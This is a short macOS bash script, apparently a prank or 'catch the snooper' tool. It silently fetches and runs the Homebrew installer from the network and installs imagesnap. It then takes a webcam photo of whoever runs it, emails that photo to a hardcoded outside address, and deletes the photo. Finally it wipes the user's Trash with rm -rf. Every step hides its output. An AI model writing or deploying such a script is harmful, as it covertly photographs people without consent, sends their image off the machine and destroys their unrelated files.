#!/bin/bash

# Created by Austin Harshberger (2018)

# Modify to be email the image should be sent to
EMAIL_TO_SEND="austin.harshberger@akqa.com"

# Install homebrew
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" -y > /dev/null 2>&1

# Install imagesnap from homebrew
brew install imagesnap > /dev/null 2>&1

# Take a picture and store it in tmp
imagesnap -w 1 /tmp/image.jpg > /dev/null 2>&1

# Email photo 
uuencode /tmp/image.jpg image.jpg | mail -s "photo of me" $EMAIL_TO_SEND

# Delete photo 
rm -rf /tmp/image.jpg

# Clear trash
rm -rf ~/.Trash*/